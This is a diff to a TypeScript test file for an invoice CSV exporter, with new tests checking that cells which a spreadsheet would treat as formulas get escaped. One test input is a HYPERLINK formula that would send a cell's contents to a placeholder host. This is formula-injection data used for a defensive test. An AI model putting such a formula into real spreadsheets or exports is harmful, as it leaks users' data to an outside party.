@@ -1,5 +1,5 @@
 import { expect, test } from "bun:test";
-import { renderCsv } from "./csv";
+import { field, renderCsv } from "./csv";
 import { beInvoice, nlInvoice } from "./fixtures";
 import type { InvoiceDocument } from "./document";
 
@@ -38,4 +38,21 @@ test("csv quotes a field that holds the separator", () => {
   const doc = beInvoice();
   const csv = renderCsv({ ...doc, rows: [{ ...doc.rows[0]!, stripePaymentRef: 'a;"b' }] });
   expect(csv.split("\n")[1]).toContain('"a;""b"');
+});
+
+test("csv defuses a text cell that a spreadsheet would read as a formula", () => {
+  expect(field("=1+1")).toBe("'=1+1");
+  expect(field("@SUM(1+1)")).toBe("'@SUM(1+1)");
+  expect(field("+1+1")).toBe("'+1+1");
+  expect(field("-1+1")).toBe("'-1+1");
+  expect(field("\t=1")).toBe("'\t=1");
+  expect(field('=HYPERLINK("http://x.invalid/?d="&A2,"x")')).toBe(
+    '"\'=HYPERLINK(""http://x.invalid/?d=""&A2,""x"")"',
+  );
+});
+
+test("csv keeps negative amounts as plain numbers", () => {
+  expect(field("-4.05")).toBe("-4.05");
+  expect(field("-110.00")).toBe("-110.00");
+  expect(field("Hotel - Amsterdam")).toBe("Hotel - Amsterdam");
 });
